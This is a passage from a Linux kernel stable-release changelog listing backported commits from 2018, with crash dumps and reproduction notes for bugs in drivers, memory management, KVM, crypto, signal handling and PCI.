or unbinding the driver. That lead to oopses like this
[ 127.842987] Unable to handle kernel paging request at virtual address bf01d04c
[ 127.850646] pgd = 70e3cd9a
[ 127.853698] [bf01d04c] \*pgd=8f908811, \*pte=00000000, \*ppte=00000000
[ 127.860412] Internal error: Oops: 80000007 [#1] PREEMPT SMP ARM
[ 127.866668] Modules linked in: bq27xxx\_battery overlay [last unloaded: omap\_hdq]
[ 127.874542] CPU: 0 PID: 1022 Comm: w1\_bus\_master1 Not tainted 4.19.0-rc4-00001-g2d51da718324 #12
[ 127.883819] Hardware name: Generic OMAP36xx (Flattened Device Tree)
[ 127.890441] PC is at 0xbf01d04c
[ 127.893798] LR is at w1\_search\_process\_cb+0x4c/0xfc
[ 127.898956] pc : [] lr : [] psr: a0070013
[ 127.905609] sp : cf885f48 ip : bf01d04c fp : ddf1e11c
[ 127.911132] r10: cf8fe040 r9 : c05f8d00 r8 : cf8fe040
[ 127.916656] r7 : 000000f0 r6 : cf8fe02c r5 : cf8fe000 r4 : cf8fe01c
[ 127.923553] r3 : c05f8d00 r2 : 000000f0 r1 : cf8fe000 r0 : dde1ef10
[ 127.930450] Flags: NzCv IRQs on FIQs on Mode SVC\_32 ISA ARM Segment none
[ 127.938018] Control: 10c5387d Table: 8f8f0019 DAC: 00000051
[ 127.944091] Process w1\_bus\_master1 (pid: 1022, stack limit = 0x9135699f)
[ 127.951171] Stack: (0xcf885f48 to 0xcf886000)
[ 127.955810] 5f40: cf8fe000 00000000 cf884000 cf8fe090 000003e8 c05f8d00
[ 127.964477] 5f60: dde5fc34 c05f9700 ddf1e100 ddf1e540 cf884000 cf8fe000 c05f9694 00000000
[ 127.973114] 5f80: dde5fc34 c01499a4 00000000 ddf1e540 c0149874 00000000 00000000 00000000
[ 127.981781] 5fa0: 00000000 00000000 00000000 c01010e8 00000000 00000000 00000000 00000000
[ 127.990447] 5fc0: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
[ 127.999114] 5fe0: 00000000 00000000 00000000 00000000 00000013 00000000 00000000 00000000
[ 128.007781] [] (w1\_search\_process\_cb) from [] (w1\_process+0x6c/0x118)
[ 128.016479] [] (w1\_process) from [] (kthread+0x130/0x148)
[ 128.024047] [] (kthread) from [] (ret\_from\_fork+0x14/0x2c)
[ 128.031677] Exception stack(0xcf885fb0 to 0xcf885ff8)
[ 128.037017] 5fa0: 00000000 00000000 00000000 00000000
[ 128.045684] 5fc0: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
[ 128.054351] 5fe0: 00000000 00000000 00000000 00000000 00000013 00000000
[ 128.061340] Code: bad PC value
[ 128.064697] ---[ end trace af066e33c0e14119 ]---
Cc:
Signed-off-by: Andreas Kemnade
Signed-off-by: Greg Kroah-Hartman
commit 9cdbf32ae7d23e2fc48ce015afdc64c8d4c37094
Author: Eugen Hristev
Date: Mon Sep 24 10:51:44 2018 +0300
iio: adc: at91: fix wrong channel number in triggered buffer mode
commit aea835f2dc8a682942b859179c49ad1841a6c8b9 upstream.
When channels are registered, the hardware channel number is not the
actual iio channel number.
This is because the driver is probed with a certain number of accessible
channels. Some pins are routed and some not, depending on the description of
the board in the DT.
Because of that, channels 0,1,2,3 can correspond to hardware channels
2,3,4,5 for example.
In the buffered triggered case, we need to do the translation accordingly.
Fixed the channel number to stop reading the wrong channel.
Fixes: 0e589d5fb ("ARM: AT91: IIO: Add AT91 ADC driver.")
Cc: Maxime Ripard
Signed-off-by: Eugen Hristev
Acked-by: Ludovic Desroches
Cc:
Signed-off-by: Jonathan Cameron
Signed-off-by: Greg Kroah-Hartman
commit b4c1120e31824071b2f9959e53caf6ce0710e689
Author: Eugen Hristev
Date: Mon Sep 24 10:51:43 2018 +0300
iio: adc: at91: fix acking DRDY irq on simple conversions
commit bc1b45326223e7e890053cf6266357adfa61942d upstream.
When doing simple conversions, the driver did not acknowledge the DRDY irq.
If this irq status is not acked, it will be left pending, and as soon as a
trigger is enabled, the irq handler will be called, it doesn't know why
this status has occurred because no channel is pending, and then it will go
int a irq loop and board will hang.
To avoid this situation, read the LCDR after a raw conversion is done.
Fixes: 0e589d5fb ("ARM: AT91: IIO: Add AT91 ADC driver.")
Cc: Maxime Ripard
Signed-off-by: Eugen Hristev
Acked-by: Ludovic Desroches
Cc:
Signed-off-by: Jonathan Cameron
Signed-off-by: Greg Kroah-Hartman
commit 8221ff37fbb89559cf8881c8d4bdbb535fd3fd87
Author: Alexey Khoroshilov
Date: Sat Sep 22 00:58:02 2018 +0300
iio: adc: imx25-gcq: Fix leak of device\_node in mx25\_gcq\_setup\_cfgs()
commit d3fa21c73c391975488818b085b894c2980ea052 upstream.
Leaving for\_each\_child\_of\_node loop we should release child device node,
if it is not stored for future use.
Found by Linux Driver Verification project (linuxtesting.org).
JC: I'm not sending this as a quick fix as it's been wrong for years,
but good to pick up for stable after the merge window.
Signed-off-by: Alexey Khoroshilov
Fixes: 6df2e98c3ea56 ("iio: adc: Add imx25-gcq ADC driver")
Cc:
Signed-off-by: Jonathan Cameron
Signed-off-by: Greg Kroah-Hartman
commit bcd4f42d000c7e332de3bf76bc0f1f720b1c56f1
Author: Lars-Peter Clausen
Date: Fri Sep 28 11:23:40 2018 +0200
iio: ad5064: Fix regulator handling
commit 8911a43bc198877fad9f4b0246a866b26bb547ab upstream.
The correct way to handle errors returned by regualtor\_get() and friends is
to propagate the error since that means that an regulator was specified,
but something went wrong when requesting it.
For handling optional regulators, e.g. when the device has an internal
vref, regulator\_get\_optional() should be used to avoid getting the dummy
regulator that the regulator core otherwise provides.
Signed-off-by: Lars-Peter Clausen
Cc:
Signed-off-by: Jonathan Cameron
Signed-off-by: Greg Kroah-Hartman
commit 33af6b490a1be6ce5a083eb961ec87ba289f5ddd
Author: Arnd Bergmann
Date: Tue Oct 30 15:07:32 2018 -0700
kbuild: fix kernel/bounds.c 'W=1' warning
commit 6a32c2469c3fbfee8f25bcd20af647326650a6cf upstream.
Building any configuration with 'make W=1' produces a warning:
kernel/bounds.c:16:6: warning: no previous prototype for 'foo' [-Wmissing-prototypes]
When also passing -Werror, this prevents us from building any other files.
Nobody ever calls the function, but we can't make it 'static' either
since we want the compiler output.
Calling it 'main' instead however avoids the warning, because gcc
does not insist on having a declaration for main.
Link: http://lkml.kernel.org/r/20181005083313.2088252-1-arnd@arndb.de
Signed-off-by: Arnd Bergmann
Reported-by: Kieran Bingham
Reviewed-by: Kieran Bingham
Cc: David Laight
Cc: Masahiro Yamada
Cc: Greg Kroah-Hartman
Cc:
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit dad142caf8b37d50e7a15ba69de530c9d1000b8b
Author: Mark Rutland
Date: Wed Oct 17 17:42:10 2018 +0100
KVM: arm64: Fix caching of host MDCR\_EL2 value
commit da5a3ce66b8bb51b0ea8a89f42aac153903f90fb upstream.
At boot time, KVM stashes the host MDCR\_EL2 value, but only does this
when the kernel is not running in hyp mode (i.e. is non-VHE). In these
cases, the stashed value of MDCR\_EL2.HPMN happens to be zero, which can
lead to CONSTRAINED UNPREDICTABLE behaviour.
Since we use this value to derive the MDCR\_EL2 value when switching
to/from a guest, after a guest have been run, the performance counters
do not behave as expected. This has been observed to result in accesses
via PMXEVTYPER\_EL0 and PMXEVCNTR\_EL0 not affecting the relevant
counters, resulting in events not being counted. In these cases, only
the fixed-purpose cycle counter appears to work as expected.
Fix this by always stashing the host MDCR\_EL2 value, regardless of VHE.
Cc: Christopher Dall
Cc: James Morse
Cc: Will Deacon
Cc: stable@vger.kernel.org
Fixes: 1e947bad0b63b351 ("arm64: KVM: Skip HYP setup when already running in HYP")
Tested-by: Robin Murphy
Signed-off-by: Mark Rutland
Signed-off-by: Marc Zyngier
Signed-off-by: Greg Kroah-Hartman
commit a665c4ab7796a5e518ecbda5455f9d44fc132ea5
Author: Punit Agrawal
Date: Mon Oct 1 16:54:35 2018 +0100
KVM: arm/arm64: Ensure only THP is candidate for adjustment
commit fd2ef358282c849c193aa36dadbf4f07f7dcd29b upstream.
PageTransCompoundMap() returns true for hugetlbfs and THP
hugepages. This behaviour incorrectly leads to stage 2 faults for
unsupported hugepage sizes (e.g., 64K hugepage with 4K pages) to be
treated as THP faults.
Tighten the check to filter out hugetlbfs pages. This also leads to
consistently mapping all unsupported hugepage sizes as PTE level
entries at stage 2.
Signed-off-by: Punit Agrawal
Reviewed-by: Suzuki Poulose
Cc: Christoffer Dall
Cc: Marc Zyngier
Cc: stable@vger.kernel.org # v4.13+
Signed-off-by: Marc Zyngier
Signed-off-by: Greg Kroah-Hartman
commit d09d8eaa18067e38d74dfe9f9e6c578bfd32a4d9
Author: Ralph Campbell
Date: Tue Oct 30 15:04:14 2018 -0700
mm/hmm: fix race between hmm\_mirror\_unregister() and mmu\_notifier callback
commit 86a2d59841ab0b147ffc1b7b3041af87927cf312 upstream.
In hmm\_mirror\_unregister(), mm->hmm is set to NULL and then
mmu\_notifier\_unregister\_no\_release() is called. That creates a small
window where mmu\_notifier can call mmu\_notifier\_ops with mm->hmm equal to
NULL. Fix this by first unregistering mmu notifier callbacks and then
setting mm->hmm to NULL.
Similarly in hmm\_register(), set mm->hmm before registering mmu\_notifier
callbacks so callback functions always see mm->hmm set.
Link: http://lkml.kernel.org/r/20181019160442.18723-4-jglisse@redhat.com
Signed-off-by: Ralph Campbell
Signed-off-by: Jérôme Glisse
Reviewed-by: John Hubbard
Reviewed-by: Jérôme Glisse
Reviewed-by: Balbir Singh
Cc:
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 7bf8e1e365ba3ff1743af3f9b1822042276b49e9
Author: Ralph Campbell
Date: Tue Oct 30 15:04:11 2018 -0700
mm/rmap: map\_pte() was not handling private ZONE\_DEVICE page properly
commit aab8d0520e6e7c2a61f71195e6ce7007a4843afb upstream.
Private ZONE\_DEVICE pages use a special pte entry and thus are not
present. Properly handle this case in map\_pte(), it is already handled in
check\_pte(), the map\_pte() part was lost in some rebase most probably.
Without this patch the slow migration path can not migrate back to any
private ZONE\_DEVICE memory to regular memory. This was found after stress
testing migration back to system memory. This ultimatly can lead to the
CPU constantly page fault looping on the special swap entry.
Link: http://lkml.kernel.org/r/20181019160442.18723-3-jglisse@redhat.com
Signed-off-by: Ralph Campbell
Signed-off-by: Jérôme Glisse
Reviewed-by: Balbir Singh
Cc: Andrew Morton
Cc: Kirill A. Shutemov
Cc:
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 6d2ac8dbfd92d37bffeb37e38629cc96c16133a3
Author: Mike Kravetz
Date: Fri Oct 26 15:10:58 2018 -0700
hugetlbfs: dirty pages as they are added to pagecache
commit 22146c3ce98962436e401f7b7016a6f664c9ffb5 upstream.
Some test systems were experiencing negative huge page reserve counts and
incorrect file block counts. This was traced to /proc/sys/vm/drop\_caches
removing clean pages from hugetlbfs file pagecaches. When non-hugetlbfs
explicit code removes the pages, the appropriate accounting is not
performed.
This can be recreated as follows:
fallocate -l 2M /dev/hugepages/foo
echo 1 > /proc/sys/vm/drop\_caches
fallocate -l 2M /dev/hugepages/foo
grep -i huge /proc/meminfo
AnonHugePages: 0 kB
ShmemHugePages: 0 kB
HugePages\_Total: 2048
HugePages\_Free: 2047
HugePages\_Rsvd: 18446744073709551615
HugePages\_Surp: 0
Hugepagesize: 2048 kB
Hugetlb: 4194304 kB
ls -lsh /dev/hugepages/foo
4.0M -rw-r--r--. 1 root root 2.0M Oct 17 20:05 /dev/hugepages/foo
To address this issue, dirty pages as they are added to pagecache. This
can easily be reproduced with fallocate as shown above. Read faulted
pages will eventually end up being marked dirty. But there is a window
where they are clean and could be impacted by code such as drop\_caches.
So, just dirty them all as they are added to the pagecache.
Link: http://lkml.kernel.org/r/b5be45b8-5afe-56cd-9482-28384699a049@oracle.com
Fixes: 6bda666a03f0 ("hugepages: fold find\_or\_alloc\_pages into huge\_no\_page()")
Signed-off-by: Mike Kravetz
Acked-by: Mihcla Hocko
Reviewed-by: Khalid Aziz
Cc: Hugh Dickins
Cc: Naoya Horiguchi
Cc: "Aneesh Kumar K . V"
Cc: Andrea Arcangeli
Cc: "Kirill A . Shutemov"
Cc: Davidlohr Bueso
Cc: Alexander Viro
Cc:
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit e484e62bc85793a40febf283f42b6480dc98cdd5
Author: Eric Biggers
Date: Fri Sep 7 14:33:24 2018 -0700
ima: fix showing large 'violations' or 'runtime\_measurements\_count'
commit 1e4c8dafbb6bf72fb5eca035b861e39c5896c2b7 upstream.
The 12 character temporary buffer is not necessarily long enough to hold
a 'long' value. Increase it.
Signed-off-by: Eric Biggers
Cc: stable@vger.kernel.org
Signed-off-by: Mimi Zohar
Signed-off-by: Greg Kroah-Hartman
commit 6f3691794c1a53e7bb252f0ca32bb898f2dacc14
Author: Vlastimil Babka
Date: Fri Oct 26 15:02:16 2018 -0700
mm: /proc/pid/smaps\_rollup: fix NULL pointer deref in smaps\_pte\_range()
commit fa76da461bb0be13c8339d984dcf179151167c8f upstream.
Leonardo reports an apparent regression in 4.19-rc7:
BUG: unable to handle kernel NULL pointer dereference at 00000000000000f0
PGD 0 P4D 0
Oops: 0000 [#1] PREEMPT SMP PTI
CPU: 3 PID: 6032 Comm: python Not tainted 4.19.0-041900rc7-lowlatency #201810071631
Hardware name: LENOVO 80UG/Toronto 4A2, BIOS 0XCN45WW 08/09/2018
RIP: 0010:smaps\_pte\_range+0x32d/0x540
Code: 80 00 00 00 00 74 a9 48 89 de 41 f6 40 52 40 0f 85 04 02 00 00 49 2b 30 48 c1 ee 0c 49 03 b0 98 00 00 00 49 8b 80 a0 00 00 00 <48> 8b b8 f0 00 00 00 e8 b7 ef ec ff 48 85 c0 0f 84 71 ff ff ff a8
RSP: 0018:ffffb0cbc484fb88 EFLAGS: 00010202
RAX: 0000000000000000 RBX: 0000560ddb9e9000 RCX: 0000000000000000
RDX: 0000000000000000 RSI: 0000000560ddb9e9 RDI: 0000000000000001
RBP: ffffb0cbc484fbc0 R08: ffff94a5a227a578 R09: ffff94a5a227a578
R10: 0000000000000000 R11: 0000560ddbbe7000 R12: ffffe903098ba728
R13: ffffb0cbc484fc78 R14: ffffb0cbc484fcf8 R15: ffff94a5a2e9cf48
FS: 00007f6dfb683740(0000) GS:ffff94a5aaf80000(0000) knlGS:0000000000000000
CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00000000000000f0 CR3: 000000011c118001 CR4: 00000000003606e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Call Trace:
\_\_walk\_page\_range+0x3c2/0x6f0
walk\_page\_vma+0x42/0x60
smap\_gather\_stats+0x79/0xe0
? gather\_pte\_stats+0x320/0x320
? gather\_hugetlb\_stats+0x70/0x70
show\_smaps\_rollup+0xcd/0x1c0
seq\_read+0x157/0x400
\_\_vfs\_read+0x3a/0x180
? security\_file\_permission+0x93/0xc0
? security\_file\_permission+0x93/0xc0
vfs\_read+0x8f/0x140
ksys\_read+0x55/0xc0
\_\_x64\_sys\_read+0x1a/0x20
do\_syscall\_64+0x5a/0x110
entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
Decoded code matched to local compilation+disassembly points to
smaps\_pte\_entry():
} else if (unlikely(IS\_ENABLED(CONFIG\_SHMEM) && mss->check\_shmem\_swap
&& pte\_none(\*pte))) {
page = find\_get\_entry(vma->vm\_file->f\_mapping,
linear\_page\_index(vma, addr));
Here, vma->vm\_file is NULL. mss->check\_shmem\_swap should be false in that
case, however for smaps\_rollup, smap\_gather\_stats() can set the flag true
for one vma and leave it true for subsequent vma's where it should be
false.
To fix, reset the check\_shmem\_swap flag to false. There's also related
bug which sets mss->swap to shmem\_swapped, which in the context of
smaps\_rollup overwrites any value accumulated from previous vma's. Fix
that as well.
Note that the report suggests a regression between 4.17.19 and 4.19-rc7,
which makes the 4.19 series ending with commit 258f669e7e88 ("mm:
/proc/pid/smaps\_rollup: convert to single value seq\_file") suspicious.
But the mss was reused for rollup since 493b0e9d945f ("mm: add
/proc/pid/smaps\_rollup") so let's play it safe with the stable backport.
Link: http://lkml.kernel.org/r/555fbd1f-4ac9-0b58-dcd4-5dc4380ff7ca@suse.cz
Link: https://bugzilla.kernel.org/show\_bug.cgi?id=201377
Fixes: 493b0e9d945f ("mm: add /proc/pid/smaps\_rollup")
Signed-off-by: Vlastimil Babka
Reported-by: Leonardo Soares Müller
Tested-by: Leonardo Soares Müller
Cc: Greg Kroah-Hartman
Cc: Daniel Colascione
Cc: Alexey Dobriyan
Cc:
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 2016e63b769222b66b9de83edf345348c0d2f2d1
Author: Jason A. Donenfeld
Date: Tue Aug 7 08:22:25 2018 +0200
crypto: speck - remove Speck
commit 578bdaabd015b9b164842c3e8ace9802f38e7ecc upstream.
These are unused, undesired, and have never actually been used by
anybody. The original authors of this code have changed their mind about
its inclusion. While originally proposed for disk encryption on low-end
devices, the idea was discarded [1] in favor of something else before
that could really get going. Therefore, this patch removes Speck.
[1] https://marc.info/?l=linux-crypto-vger&m=153359499015659
Signed-off-by: Jason A. Donenfeld
Acked-by: Eric Biggers
Cc: stable@vger.kernel.org
Acked-by: Ard Biesheuvel
Signed-off-by: Herbert Xu
Signed-off-by: Greg Kroah-Hartman
commit d4c47d9cf347ee13a2fb799dd8900caac586d38d
Author: Ard Biesheuvel
Date: Mon Oct 1 10:36:38 2018 +0200
crypto: aegis/generic - fix for big endian systems
commit 4a34e3c2f2f48f47213702a84a123af0fe21ad60 upstream.
Use the correct \_\_le32 annotation and accessors to perform the
single round of AES encryption performed inside the AEGIS transform.
Otherwise, tcrypt reports:
alg: aead: Test 1 failed on encryption for aegis128-generic
00000000: 6c 25 25 4a 3c 10 1d 27 2b c1 d4 84 9a ef 7f 6e
alg: aead: Test 1 failed on encryption for aegis128l-generic
00000000: cd c6 e3 b8 a0 70 9d 8e c2 4f 6f fe 71 42 df 28
alg: aead: Test 1 failed on encryption for aegis256-generic
00000000: aa ed 07 b1 96 1d e9 e6 f2 ed b5 8e 1c 5f dc 1c
Fixes: f606a88e5823 ("crypto: aegis - Add generic AEGIS AEAD implementations")
Cc:  # v4.18+
Signed-off-by: Ard Biesheuvel
Reviewed-by: Ondrej Mosnacek
Signed-off-by: Herbert Xu
Signed-off-by: Greg Kroah-Hartman
commit 805fd900bda2b7e7d147aed506e892e67b6f0aac
Author: Ard Biesheuvel
Date: Mon Oct 1 10:36:37 2018 +0200
crypto: morus/generic - fix for big endian systems
commit 5a8dedfa3276e88c5865f265195d63d72aec3e72 upstream.
Omit the endian swabbing when folding the lengths of the assoc and
crypt input buffers into the state to finalize the tag. This is not
necessary given that the memory representation of the state is in
machine native endianness already.
This fixes an error reported by tcrypt running on a big endian system:
alg: aead: Test 2 failed on encryption for morus640-generic
00000000: a8 30 ef fb e6 26 eb 23 b0 87 dd 98 57 f3 e1 4b
00000010: 21
alg: aead: Test 2 failed on encryption for morus1280-generic
00000000: 88 19 1b fb 1c 29 49 0e ee 82 2f cb 97 a6 a5 ee
00000010: 5f
Fixes: 396be41f16fd ("crypto: morus - Add generic MORUS AEAD implementations")
Cc:  # v4.18+
Reviewed-by: Ondrej Mosnacek
Signed-off-by: Ard Biesheuvel
Signed-off-by: Herbert Xu
Signed-off-by: Greg Kroah-Hartman
commit 9899e0e4528e751739b5144a25e3957760ff1928
Author: Mikulas Patocka
Date: Wed Sep 5 09:18:43 2018 -0400
crypto: aesni - don't use GFP\_ATOMIC allocation if the request doesn't cross a page in gcm
commit a788848116454d753b13a4888e0e31ada3c4d393 upstream.
This patch fixes gcmaes\_crypt\_by\_sg so that it won't use memory
allocation if the data doesn't cross a page boundary.
Authenticated encryption may be used by dm-crypt. If the encryption or
decryption fails, it would result in I/O error and filesystem corruption.
The function gcmaes\_crypt\_by\_sg is using GFP\_ATOMIC allocation that can
fail anytime. This patch fixes the logic so that it won't attempt the
failing allocation if the data doesn't cross a page boundary.
Signed-off-by: Mikulas Patocka
Cc: stable@vger.kernel.org
Signed-off-by: Herbert Xu
Signed-off-by: Greg Kroah-Hartman
commit c00600a96550216a4b6a6c77c2c641691d4aa1a6
Author: Horia Geantă
Date: Wed Sep 12 16:20:48 2018 +0300
crypto: tcrypt - fix ghash-generic speed test
commit 331351f89c36bf7d03561a28b6f64fa10a9f6f3a upstream.
ghash is a keyed hash algorithm, thus setkey needs to be called.
Otherwise the following error occurs:
$ modprobe tcrypt mode=318 sec=1
testing speed of async ghash-generic (ghash-generic)
tcrypt: test 0 ( 16 byte blocks, 16 bytes per update, 1 updates):
tcrypt: hashing failed ret=-126
Cc:  # 4.6+
Fixes: 0660511c0bee ("crypto: tcrypt - Use ahash")
Tested-by: Franck Lenormand
Signed-off-by: Horia Geantă
Acked-by: Ard Biesheuvel
Signed-off-by: Herbert Xu
Signed-off-by: Greg Kroah-Hartman
commit 6aa3369f176858ca4900320bddbd4d5d5722e09b
Author: Ondrej Mosnacek
Date: Thu Sep 13 10:51:31 2018 +0200
crypto: lrw - Fix out-of bounds access on counter overflow
commit fbe1a850b3b1522e9fc22319ccbbcd2ab05328d2 upstream.
When the LRW block counter overflows, the current implementation returns
128 as the index to the precomputed multiplication table, which has 128
entries. This patch fixes it to return the correct value (127).
Fixes: 64470f1b8510 ("[CRYPTO] lrw: Liskov Rivest Wagner, a tweakable narrow block cipher mode")
Cc:  # 2.6.20+
Reported-by: Eric Biggers
Signed-off-by: Ondrej Mosnacek
Signed-off-by: Herbert Xu
Signed-off-by: Greg Kroah-Hartman
commit 9f0654d9a878add21b8140335b78bd3aaff9b252
Author: Eric W. Biederman
Date: Wed Oct 10 20:29:44 2018 -0500
signal: Guard against negative signal numbers in copy\_siginfo\_from\_user32
commit a36700589b85443e28170be59fa11c8a104130a5 upstream.
While fixing an out of bounds array access in known\_siginfo\_layout
reported by the kernel test robot it became apparent that the same bug
exists in siginfo\_layout and affects copy\_siginfo\_from\_user32.
The straight forward fix that makes guards against making this mistake
in the future and should keep the code size small is to just take an
unsigned signal number instead of a signed signal number, as I did to
fix known\_siginfo\_layout.
Cc: stable@vger.kernel.org
Fixes: cc731525f26a ("signal: Remove kernel interal si\_code magic")
Signed-off-by: "Eric W. Biederman"
Signed-off-by: Greg Kroah-Hartman
commit 071161f0cce48cb7b72215fe02b71b4985f2f26a
Author: Eric W. Biederman
Date: Thu Sep 13 11:28:01 2018 +0200
signal/GenWQE: Fix sending of SIGKILL
commit 0ab93e9c99f8208c0a1a7b7170c827936268c996 upstream.
The genweq\_add\_file and genwqe\_del\_file by caching current without
using reference counting embed the assumption that a file descriptor
will never be passed from one process to another. It even embeds the
assumption that the the thread that opened the file will be in
existence when the process terminates. Neither of which are
guaranteed to be true.
Therefore replace caching the task\_struct of the opener with
pid of the openers thread group id. All the knowledge of the
opener is used for is as the target of SIGKILL and a SIGKILL
will kill the entire process group.
Rename genwqe\_force\_sig to genwqe\_terminate, remove it's unncessary
signal argument, update it's ownly caller, and use kill\_pid
instead of force\_sig.
The work force\_sig does in changing signal handling state is not
relevant to SIGKILL sent as SEND\_SIG\_PRIV. The exact same processess
will be killed just with less work, and less confusion. The work done
by force\_sig is really only needed for handling syncrhonous
exceptions.
It will still be possible to cause genwqe\_device\_remove to wait
8 seconds by passing a file descriptor to another process but
the possible user after free is fixed.
Fixes: eaf4722d4645 ("GenWQE Character device and DDCB queue")
Cc: stable@vger.kernel.org
Cc: Greg Kroah-Hartman
Cc: Frank Haverkamp
Cc: Joerg-Stephan Vogt
Cc: Michael Jung
Cc: Michael Ruettger
Cc: Kleber Sacilotto de Souza
Cc: Sebastian Ott
Cc: Eberhard S. Amann
Cc: Gabriel Krisman Bertazi
Cc: Guilherme G. Piccoli
Signed-off-by: "Eric W. Biederman"
Signed-off-by: Greg Kroah-Hartman
commit a5d415583c307818e62a34ca16d37c93e003fb34
Author: Keith Busch
Date: Tue May 8 10:00:22 2018 -0600
PCI: vmd: White list for fast interrupt handlers
commit a7f58b9ecfd3c0f63703ec10f4a592cc38dbd1b8 upstream.
Devices with slow interrupt handlers are significantly harming
performance when their interrupt vector is shared with a fast device.
Create a class code white list for devices with known fast interrupt
handlers and let all other devices share a single vector so that they
don't interfere with performance.
At the moment, only the NVM Express class code is on the list, but more
may be added if VMD users desire to use other low-latency devices in
these domains.
Signed-off-by: Keith Busch
[lorenzo.pieralisi@arm.com: changelog]
Signed-off-by: Lorenzo Pieralisi
Acked-by: Jon Derrick:
Cc: "Heitke, Kenneth"
Signed-off-by: Greg Kroah-Hartman
commit a06dfc8d5e184b48972a5e8c44385ab787b8e5b3
Author: Bin Meng
Date: Wed Sep 26 08:14:01 2018 -0700
PCI: Add Device IDs for Intel GPU "spurious interrupt" quirk
commit d0c9606b31a21028fb5b753c8ad79626292accfd upstream.
Add Device IDs to the Intel GPU "spurious interrupt" quirk table.
For these devices, unplugging the VGA cable and plugging it in again causes
spurious interrupts from the IGD. Linux eventually disables the interrupt,
but of course that disables any other devices sharing the interrupt.
The theory is that this is a VGA BIOS defect: it should have disabled the
IGD interrupt but failed to do so.
See f67fd55fa96f ("PCI: Add quirk for still enabled interrupts on Intel
Sandy Bridge GPUs") and 7c82126a94e6 ("PCI: Add new ID for Intel GPU
"spurious interrupt" quirk") for some history.
[bhelgaas: See link below for discussion about how to fix this more
generically instead of adding device IDs for every new Intel GPU. I hope
this is the last patch to add device IDs.]
Link: https://lore.kernel.org/linux-pci/1537974841-29928-1-git-send-email-bmeng.cn@gmail.com
Signed-off-by: Bin Meng
[bhelgaas: changelog]
Signed-off-by: Bjorn Helgaas
Cc: stable@vger.kernel.org # v3.4+
Signed-off-by: Greg Kroah-Hartman
commit c34f34ce93bbd4efc18b75daf4e6fa250ed8df9f
Author: Lukas Wunner
Date: Tue Sep 4 12:34:18 2018 -0500
PCI/ASPM: Fix link\_state teardown on device removal
commit aeae4f3e5c38d47bdaef50446dc0ec857307df68 upstream.
Upon removal of the last device on a bus, the link\_state of the bridge
leading to that bus is sought to be torn down by having pci\_stop\_dev()
call pcie\_aspm\_exit\_link\_state().
When ASPM was originally introduced by commit 7d715a6c1ae5 ("PCI: add
PCI Express ASPM support"), it determined whether the device being
removed is the last one by calling list\_empty() on the bridge's
subordinate devices list. That didn't work because the device is only
removed from the list slightly later in pci\_destroy\_dev().
Commit 3419c75e15f8 ("PCI: properly clean up ASPM link state on device
remove") attempted to fix it by calling list\_is\_last(), but that's not
correct either because it checks whether the device is at the \*end\* of
the list, not whether it's the last one \*left\* in the list. If the user
removes the device which happens to be at the end of the list via sysfs
but other devices are preceding the device in the list, the link\_state
is torn down prematurely.
The real fix is to move the invocation of pcie\_aspm\_exit\_link\_state() to
pci\_destroy\_dev() and reinstate the call to list\_empty(). Remove a
duplicate check for dev->bus->self because pcie\_aspm\_exit\_link\_state()
already contains an identical check.
Fixes: 7d715a6c1ae5 ("PCI: add PCI Express ASPM support")
Signed-off-by: Lukas Wunner
Signed-off-by: Bjorn Helgaas
Cc: Shaohua Li
Cc: stable@vger.kernel.org # v2.6.26
Signed-off-by: Greg Kroah-Hartman
commit 2e952918d04a1182add87704f09ec684e37cb984
Author: Vignesh R
Date: Tue Sep 25 10:51:51 2018 +0530
ARM: dts: dra7: Fix up unaligned access setting for PCIe EP
commit 6d0af44a82be87c13f2320821e9fbb8b8cf5a56f upstream.
Bit positions of PCIE\_SS1\_AXI2OCP\_LEGACY\_MODE\_ENABLE and
PCIE\_SS1\_AXI2OCP\_LEGACY\_MODE\_ENABLE in CTRL\_CORE\_SMA\_SW\_7 are
incorrectly documented in the TRM. In fact, the bit positions are
swapped. Update the DT bindings for PCIe EP to reflect the same.
Fixes: d23f3839fe97 ("ARM: dts: DRA7: Add pcie1 dt node for EP mode")
Cc: stable@vger.kernel.org
Signed-off-by: Vignesh R
Signed-off-by: Tony Lindgren
Signed-off-by: Greg Kroah-Hartman
commit 5074cd8b99369854e99d15bec52fe2b213fea796
Author: Qiuxu Zhuo
Date: Tue Oct 9 10:20:25 2018 -0700
EDAC, skx\_edac: Fix logical channel intermediate decoding
commit 8f18973877204dc8ca4ce1004a5d28683b9a7086 upstream.
The code "lchan = (lchan << 1) | ~lchan" for logical channel
intermediate decoding is wrong. The wrong intermediate decoding
result is {0xffffffff, 0xfffffffe}.
Fix it by replacing '~' with '!'. The correct intermediate
decoding result is {0x1, 0x2}.
Signed-off-by: Qiuxu Zhuo
Signed-off-by: Tony Luck
Signed-off-by: Borislav Petkov
CC: Aristeu Rozanski
CC: Mauro Carvalho Chehab
CC: linux-edac
Cc: stable@vger.kernel.org
Link: http://lkml.kernel.org/r/20181009172025.18594-1-tony.luck@intel.com
Signed-off-by: Greg Kroah-Hartman
commit b0fc82d940a5a86b20e23fdc44e16e42259ab6dd
Author: Tony Luck
Date: Fri Sep 28 14:39:34 2018 -0700
EDAC, {i7core,sb,skx}\_edac: Fix uncorrected error counting
commit 432de7fd7630c84ad24f1c2acd1e3bb4ce3741ca upstream.
The count of errors is picked up from bits 52:38 of the machine check
bank status register. But this is the count of \*corrected\* errors. If an
uncorrected error is being logged, the h/w sets this field to 0. Which
means that when edac\_mc\_handle\_error() is called, the EDAC core will
carefully add zero to the appropriate uncorrected error counts.
Signed-off-by: Tony Luck
[ Massage commit message. ]
Signed-off-by: Borislav Petkov
Cc: stable@vger.kernel.org
Cc: Aristeu Rozanski
Cc: Mauro Carvalho Chehab
